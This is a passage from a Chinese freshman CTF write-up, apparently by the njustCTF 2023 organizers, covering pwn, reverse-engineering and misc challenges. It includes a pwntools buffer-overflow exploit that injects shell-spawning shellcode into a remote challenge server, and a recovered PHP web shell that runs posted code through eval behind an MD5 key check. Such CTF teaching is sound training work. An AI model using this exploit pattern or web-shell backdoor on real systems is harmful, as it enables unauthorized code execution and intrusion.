+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;47.92.3.18&quot;</span>, <span class="number">60005</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;qwq\n&quot;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x50</span> + <span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(buf_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>欢迎大家选择PWN方向，CTF可能会很难，但是万事开头难。昨天在群里看到在聊CTF劝退的事情，其实学到后面你能大大地开阔眼界，学到很多学校课本里学不到的知识(学校里学的都快十几二十年前的了)，认识很多志同道合的朋友(可能有985全能保研佬或者双非专科的技术大佬)。当然最重要的就是你知道自己要什么啦，希望看到这里的学弟学妹们可以度过一个充实的大学生活！</p>
+<p>Bye</p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="length"><a href="#length" class="headerlink" title="length"></a>length</h2><p>用IDA打开</p>
+<p>按下F5查看伪代码</p>
+<p><img src="/../images/r1.jpg" alt="r1"></p>
+<p>点击r数组即可得到密文数组</p>
+<p><img src="/../images/r2.png" alt="r2"></p>
+<p>选中r数组然后按下 shift+E 即可快速提取数据</p>
+<p>当然也可以一个一个地抄下来</p>
+<p>只需要将r数组每个字符的ascii加80就可以得到flag了</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x1A</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0xF6</span>, <span class="number">0x2B</span>, <span class="number">0x29</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0x12</span>, <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xFD</span>, <span class="number">0x12</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x21</span>, <span class="number">0xFC</span>, <span class="number">0xF6</span>, <span class="number">0x27</span>, <span class="number">0xE1</span>, <span class="number">0xF9</span>, <span class="number">0x06</span>, <span class="number">0xE8</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0x21</span>, <span class="number">0xF4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0x11</span>, <span class="number">0xF4</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x1A</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">        r[i]+=<span class="number">80</span>;</span><br><span class="line">        cout&lt;&lt;r[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// njustCTF&#123;yHbOHMbOP2FoqLFw1IV8K9qDwPHPKiYr7aD4X1Sj&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:  njustCTF{yHbOHMbOP2FoqLFw1IV8K9qDwPHPKiYr7aD4X1Sj}</p>
+<h2 id="dbg"><a href="#dbg" class="headerlink" title="dbg"></a>dbg</h2><p>放进IDA里看一看，按下F5，发现没有什么东西</p>
+<p>返回汇编界面，可以看到这个跳转应该是将有flag的分支和无flag的分支分开了</p>
+<p><img src="/../images/r3.png" alt="r3"></p>
+<p>那么我们可以在动态调试中将这个语句使用nop填充，这样就可以走到有flag的分支了</p>
+<p>在x96dbg.exe中打开</p>
+<p><img src="/../images/r4.png" alt="r4"><br>右键，然后选择搜索，选择所有用户模块，选择字符串</p>
+<p><img src="/../images/r5.png" alt="r5"></p>
+<p>可以在下面搜索flag，也可以直接找可以字符串，这里我们找到了flag is not here 和flag is here,随便点一个</p>
+<p><img src="/../images/r6.png" alt="r6"></p>
+<p>找到我们刚刚在IDA中分析的跳转，点击这条指令，右键选择二进制，再选择用nop填充,nop的意思是空，就是这条语句不执行，这样就跳转到我们想要的分支，然后往下找，在第一个ret指令前按下F2下一个断点，保证程序不跑飞，使得我们能够看到flag</p>
+<p><img src="/../images/r7.png" alt="r7"></p>
+<p><img src="/../images/r8.png" alt="r8"></p>
+<p>做完这些工作之后，按下F9，使程序运行，多按下几次，直到程序运行到我们下的断点后不再按F9，此时程序已经输出flag</p>
+<p><img src="/../images/r9.png" alt="r9"></p>
+<p>njustCTF{8iu938xadpq3otc1pj39hgn4x11l5z9isc8g32}</p>
+<h2 id="xorxor"><a href="#xorxor" class="headerlink" title="xorxor"></a>xorxor</h2><p>ELF文件，是linux下的可执行文件，可以将该文件复制到linux虚拟机下运行</p>
+<p>IDA可以分析ELF程序</p>
+<p>直接拖入IDA查看</p>
+<p>按下F5查看伪代码</p>
+<p><img src="/../images/r10.png" alt="r10"></p>
+<p>要注意的是，0x7075755545545C4F的正常顺序是这样的：0x4F, 0x5C, 0x54, 0x45, 0x55, 0x75, 0x75, 0x70</p>
+<p>提取数据有点麻烦，可以使用shift+E,也可以一个个抄下来，注意v7要先转换成hex(十六进制编码)，然后抄下来</p>
+<p>提取数据对于新生来说可能是一个难点</p>
+<p>主要加密逻辑就是，第奇数个字符xor 0x36，第偶数个字符 xor 0x21</p>
+<p>解密脚本非常简单</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r[] =</span><br><span class="line">&#123;</span><br><span class="line"> <span class="number">0x4F</span>, <span class="number">0x5C</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x55</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x70</span>,</span><br><span class="line"> <span class="number">0x5A</span>, <span class="number">0x63</span>, <span class="number">0x44</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x5F</span>, <span class="number">0x4E</span>, <span class="number">0x45</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x42</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x6B</span>, <span class="number">0x46</span>,</span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x78</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x59</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0x5F</span>,</span><br><span class="line">   <span class="number">0x7B</span>, <span class="number">0x79</span>, <span class="number">0x58</span>, <span class="number">0x50</span>, <span class="number">0x19</span>, <span class="number">0x47</span>, <span class="number">0x68</span>, <span class="number">0x05</span>,</span><br><span class="line">   <span class="number">0x68</span>, <span class="number">0x4B</span>   </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )                        </span><br><span class="line">      r[i] ^= <span class="number">0x36u</span>;                          </span><br><span class="line">    <span class="keyword">else</span>                                    </span><br><span class="line">      r[i] ^= <span class="number">0x21u</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;r[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// njustCTF&#123;UeSGioswt54oyJp8NjzxGoiZOyf8qI3I&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:  njustCTF{UeSGioswt54oyJp8NjzxGoiZOyf8qI3I}</p>
+<h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>不指望新生能做出来，题目使用了RC4加密算法</p>
+<p>在这里只简单介绍一下做法</p>
+<p><img src="/../images/r11.jpg" alt="r11"></p>
+<p>看到32、33两行，encryinput这个变量是最后与密文比较的变量，这个变量是如何来的？</p>
+<p>可以看到这个变量是由输入的对应位异或 一个不知道什么的东西，之后再异或了一个0x36（这个0x36异或没什么作用，本来异或的v4就是一个随机的值）</p>
+<p>我们可以认为，这个v4数组对于不同的位置上是随机的数组，也就是说每一位input都异或了一个不同的值</p>
+<p>针对这个特点，以及我们了解的异或的特点，我们可以想出一种不需要了解RC4的具体原理也可以做出题目的解法。虽然v4数组在不同位置上都不同，但是它是固定的，不会随时间而改变，我们可以随便输出一堆字符，然后在动态调试时直接提取出encryinput的值，让这两个异或，这样就得到了v4数组的值。</p>
+<p>在将得到的这个值与ciphertext异或即可得到flag。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc123456[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xC9</span>, <span class="number">0x5C</span>, <span class="number">0xC8</span>, <span class="number">0x72</span>, <span class="number">0xBD</span>, <span class="number">0x70</span>, <span class="number">0xAC</span>, <span class="number">0x3A</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0xFC</span>, <span class="number">0x16</span>, <span class="number">0xDB</span>, <span class="number">0x20</span>, <span class="number">0xDA</span>, <span class="number">0x0F</span>, <span class="number">0xFF</span>, <span class="number">0x6B</span>, <span class="number">0xD1</span>, <span class="number">0xD5</span>, </span><br><span class="line">  <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0xBA</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0xDB</span>, <span class="number">0xA2</span>, <span class="number">0xE8</span>, <span class="number">0x44</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xDC</span>, <span class="number">0xD4</span>, <span class="number">0x19</span>, <span class="number">0xB3</span>, <span class="number">0x20</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ciphertext[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x8E</span>, <span class="number">0x35</span>, <span class="number">0xFC</span>, <span class="number">0x05</span>, <span class="number">0xCF</span>, <span class="number">0x44</span>, <span class="number">0xF1</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x5A</span>, <span class="number">0xFC</span>, <span class="number">0x0C</span>, <span class="number">0x8D</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x25</span>, <span class="number">0xD0</span>, <span class="number">0x15</span>, <span class="number">0x31</span>, <span class="number">0xDD</span>, <span class="number">0xCA</span>, <span class="number">0x8F</span>, <span class="number">0x05</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0x9E</span>, <span class="number">0x1A</span>, <span class="number">0xF5</span>, <span class="number">0x68</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> input[]=<span class="string">&quot;12345678901234567890123456789012345&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++)&#123;</span><br><span class="line">        input[i]^=enc123456[i];</span><br><span class="line">        ciphertext[i]^=input[i];</span><br><span class="line">        cout&lt;&lt;ciphertext[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// njustCTF&#123;Ea5y_Rc4_enCRYpT0__x0rx0r&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag: njustCTF{Ea5y_Rc4_enCRYpT0__x0rx0r}</p>
+<p>（当然不进行动态调试，直接静态分析逆出RC4也完全可以）</p>
+<h2 id="pyregex"><a href="#pyregex" class="headerlink" title="pyregex"></a>pyregex</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b64=<span class="string">&quot;c3RyaW5nID0gcidebig/PS51LnQpai5zLihDKVQoPz0uezE0fXdpKUZceyg/PS57MjR9KD8hLikpKFxkKSg/PD0yKD89MC4zKSkoXGQpKD89XDIpKFxkKShcZClfKD89LlwuKVwxKC4pQVw2VFw2KD89XF8pKC4uLi4oPzw9bikpXDdcNyg/PVx9KS4n&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(base64.b64decode(b64),<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line">your_flag= <span class="built_in">input</span>(<span class="string">&quot;plz input your flag:&quot;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(string, your_flag)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag is right!!!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag is wrong!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>eval(compile(base64.b64decode(b64),’<string>‘,’exec’))这段代码的意思时首先将b64进行base64解码，然后将解码后的字符串当作python代码执行。</p>
+<p>我们首先进行一下base64解码，得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">r&#x27;^n(?=.u.t)j.s.(C)T(?=.&#123;14&#125;wi)F\&#123;(?=.&#123;24&#125;(?!.))(\d)(?&lt;=2(?=0.3))(\d)(?=\2)(\d)(\d)_(?=.\.)\1(.)A\6T\6(?=\_)(....(?&lt;=n))\7\7(?=\&#125;).&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一个正则表达式，通过re模块对输入进行字符串匹配。</p>
+<p>这个题目的难点在于这个正则表达式。</p>
+<p>去简单学习一下正则表达式就可以了</p>
+<p>考虑到新生水平，正则表达式没有出很复杂，现场学也完全来得及</p>
+<p>答案是这样的：njustCTF{2023_C.A.T._win_win_win}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="尊嘟假嘟"><a href="#尊嘟假嘟" class="headerlink" title="尊嘟假嘟"></a>尊嘟假嘟</h2><p>暑假刷b站视频找到的idea，可以直接找到翻译器 <a target="_blank" rel="noopener" href="https://zdjd.vercel.app/">https://zdjd.vercel.app/</a></p>
+<p>如果查看 GitHub 的源码，可以发现本质是个 base64</p>
+<h2 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h2><p>直接搜返回码为200的，能找到访问了一个叫muma.php的流量</p>
+<p><img src="/../images/c1c3f0f344a440864c956f4d81099610.png" alt="1697712365707"></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]) === <span class="string">&quot;40505608ab4e8638d4d84f5662692d5d&quot;</span>)</span></span><br><span class="line"><span class="language-php">&#123;</span></span><br><span class="line"><span class="language-php">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span></span></span><br><span class="line"><span class="language-php">&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&quot;sorry,hacker&quot;</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这是还原出的代码内容，只有post中的key的值的md5为405056……时才可以进入eval分支进行rce，解密得到h4cker</p>
+<h2 id="是男人就下一百层"><a href="#是男人就下一百层" class="headerlink" title="是男人就下一百层"></a>是男人就下一百层</h2><p>一百层压缩包，点完之后是个伪加密，但是大伙的工具比较新鲜导致伪加密这一步好像被非预期了</p>
+<p>贴一个自动解压缩脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">&quot;./&quot;</span>+<span class="built_in">str</span>(<span class="number">100</span>-i)+<span class="string">&quot;.zip&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> z:</span><br><span class="line">        z.extractall()</span><br><span class="line">        z.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezLSB"><a href="#ezLSB" class="headerlink" title="ezLSB"></a>ezLSB</h2><p>简单的LSB隐写，可以直接用那个工具解决（stego）不再赘述</p>
+<p>贴一个脚本解法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;22.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = Image.<span class="built_in">open</span>(file)</span><br><span class="line"></span><br><span class="line">width = <span class="built_in">map</span>.size[<span class="number">0</span>]</span><br><span class="line">height = <span class="built_in">map</span>.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getchr</span>(<span class="params"><span class="built_in">chr</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">flag</span>):</span><br><span class="line">    char = <span class="built_in">int</span>(flag,base=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(char)</span><br><span class="line"></span><br><span class="line">bitstr = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = <span class="built_in">map</span>.getpixel((w,h))</span><br><span class="line">        bitstr += getchr(<span class="built_in">list</span>(pix)[<span class="number">1</span>]%<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">lenth = <span class="number">180</span></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bitstr:</span><br><span class="line">    flag+=i</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    cnt%=<span class="number">8</span></span><br><span class="line">    b+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> b == lenth*<span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(cnt == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(trans(flag),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="HardLSB"><a href="#HardLSB" class="headerlink" title="HardLSB"></a>HardLSB</h2><p>复杂的LSB，原理是LSB隐写但是写的路径是围着图片绕一圈，所以大家在软件里面会看到第一行的像素里面的LSB是正常的，但是后面就解不出来了。</p>
+<p>需要自己写脚本完成,exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;2.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = Image.<span class="built_in">open</span>(file)</span><br><span class="line"></span><br><span class="line">width = <span class="built_in">map</span>.size[<span class="number">0</span>]</span><br><span class="line">height = <span class="built_in">map</span>.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getchr</span>(<span class="params"><span class="built_in">chr</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">flag</span>):</span><br><span class="line">    char = <span class="built_in">int</span>(flag,base=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(char)</span><br><span class="line"></span><br><span class="line">bitstr = <span class="string">&quot;&quot;</span></span><br><span class="line">h = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width-<span class="number">1</span>):</span><br><span class="line">    pix = <span class="built_in">list</span>(<span class="built_in">map</span>.getpixel((w,h)))</span><br><span class="line">    bitstr += getchr(<span class="built_in">list</span>(pix)[<span class="number">1</span>]%<span class="number">2</span>)</span><br><span class="line">w = width-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height-<span class="number">1</span>):</span><br><span class="line">    pix = <span class="built_in">list</span>(<span class="built_in">map</span>.getpixel((w,h)))</span><br><span class="line">    bitstr += getchr(<span class="built_in">list</span>(pix)[<span class="number">1</span>]%<span class="number">2</span>)</span><br><span class="line">h = height-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width-<span class="number">1</span>):</span><br><span class="line">    pix = <span class="built_in">list</span>(<span class="built_in">map</span>.getpixel((width-<span class="number">1</span>-w,h)))</span><br><span class="line">    bitstr += getchr(<span class="built_in">list</span>(pix)[<span class="number">1</span>]%<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line">w = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height-<span class="number">1</span>):</span><br><span class="line">    pix = <span class="built_in">list</span>(<span class="built_in">map</span>.getpixel((w,height-<span class="number">1</span>-h)))</span><br><span class="line">    bitstr += getchr(<span 